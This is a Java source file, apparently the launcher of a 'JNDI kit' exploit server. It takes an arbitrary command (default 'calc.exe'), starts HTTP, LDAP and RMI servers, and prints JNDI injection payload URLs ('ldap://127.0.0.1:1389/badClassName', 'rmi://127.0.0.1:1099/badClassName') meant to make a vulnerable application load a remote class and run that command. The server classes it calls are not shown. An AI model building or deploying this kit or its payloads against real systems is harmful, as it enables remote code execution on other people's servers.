package org.sec;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class ServerMain {
    private static final Logger logger = LogManager.getLogger(ServerMain.class);

    public static void main(String[] args) {
        try {
            String cmd;
            if (args.length == 0) {
                cmd = "calc.exe";
            } else {
                cmd = args[0];
            }
            Logo.print();
            logger.info("start jndi kit");
            logger.info("cmd: " + cmd);
            new Thread(() -> Http.start(cmd)).start();
            new Thread(Ldap::start).start();
            new Thread(RMI::start).start();

            Thread.sleep(1000);
            System.out.println("|--------------------------------------------------------|");
            System.out.println("|------Payload: ldap://127.0.0.1:1389/badClassName-------|");
            System.out.println("|------Payload: rmi://127.0.0.1:1099/badClassName-------|");
            System.out.println("|--------------------------------------------------------|");
        } catch (Exception e) {
            logger.error(e.getMessage());
        }
    }
}
